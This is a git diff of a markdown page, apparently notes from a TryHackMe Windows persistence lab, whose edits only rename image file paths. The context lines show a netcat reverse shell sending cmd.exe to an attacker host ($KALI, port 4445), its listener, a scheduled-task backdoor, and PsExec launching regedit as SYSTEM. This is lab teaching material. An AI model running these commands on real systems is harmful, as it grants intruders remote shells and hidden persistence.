@@ -238,7 +238,7 @@ Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe $KALI 4445"
 nc -lvp 4445
 ```
 
-<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (2) (3).png" alt=""><figcaption></figcaption></figure>
 
 ### Hijacking File Associations
 
@@ -446,7 +446,7 @@ To check if our task was successfully created, we can use the following command.
 schtasks /query /tn thm-taskbackdoor
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3) (3).png" alt=""><figcaption></figcaption></figure>
 
 ### Making Our Task Invisible
 
@@ -596,7 +596,7 @@ Note: While in a real-world set-up you could use any name for your registry entr
 <pre><code><strong>C:\tools\pstools\PsExec64.exe -i -s regedit
 </strong></code></pre>
 
-![](<../../.gitbook/assets/image (3) (2).png>)
+![](<../../.gitbook/assets/image (3) (2) (4).png>)
 
 <figure><img src="../../.gitbook/assets/image (1) (2) (5).png" alt=""><figcaption></figcaption></figure>
 
